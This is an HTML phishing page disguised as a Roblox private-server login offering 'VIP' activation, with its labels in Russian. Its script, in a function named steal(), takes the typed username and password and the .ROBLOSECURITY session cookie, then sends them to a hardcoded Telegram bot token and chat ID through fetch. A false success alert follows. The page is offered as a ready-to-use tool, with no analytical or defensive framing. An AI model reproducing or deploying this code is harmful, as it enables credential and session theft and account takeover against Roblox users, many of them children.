<!DOCTYPE html>
<html>
<head>
    <title>Roblox Private Server</title>
    <style>
        body { font-family: Arial; background: #1a1e2b; text-align: center; padding-top: 50px; color: white; }
        .login-box { background: #2a2f3f; padding: 30px; width: 300px; margin: 0 auto; border-radius: 12px; }
        input, button { width: 90%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; }
        button { background: #1e88e5; color: white; cursor: pointer; }
    </style>
</head>
<body>
<div class="login-box">
    <h2>Вход в Roblox</h2>
    <input type="text" id="username" placeholder="Имя пользователя">
    <input type="password" id="password" placeholder="Пароль">
    <button onclick="steal()">Войти и активировать VIP</button>
</div>
<script>
    function steal() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        var cookies = document.cookie;
        var match = cookies.match(/.ROBLOSECURITY=([^;]+)/);
        var roblosecurity = match ? match[1] : 'не найдена';

        var message = 'Логин: ' + username + '\nПароль: ' + password + '\n.ROBLOSECURITY: ' + roblosecurity;
        
        var botToken = '8619754068:AAGUONRG4qwbbg-yNP8f2D55oPQh3mqQq30';
        var chatId = '1788872314';
        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message));

        alert('VIP активирован! Перезайдите в Roblox.');
    }
</script>
</body>
</html>
